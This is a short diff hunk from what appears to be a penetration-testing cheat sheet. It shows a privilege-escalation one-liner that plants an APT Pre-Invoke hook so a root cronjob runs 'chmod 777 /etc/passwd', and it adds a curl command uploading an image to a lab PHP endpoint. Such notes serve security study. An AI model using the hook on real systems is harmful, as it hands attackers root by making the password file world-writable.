@@ -3115,3 +3115,8 @@ run
 
 	Write Access to /etc/apt/apt.conf.d, apt-get update run on cronjob by root:
  		echo 'APT::Update::Pre-Invoke {"chmod 777 /etc/passwd";}' >> 3update
+
+# Curl CheatSheet
+
+	Uploading To Upload.php With Curl:
+ 		curl -F myFile=@family_guy_stare.jpg http://192.168.216.183/exiftest.php
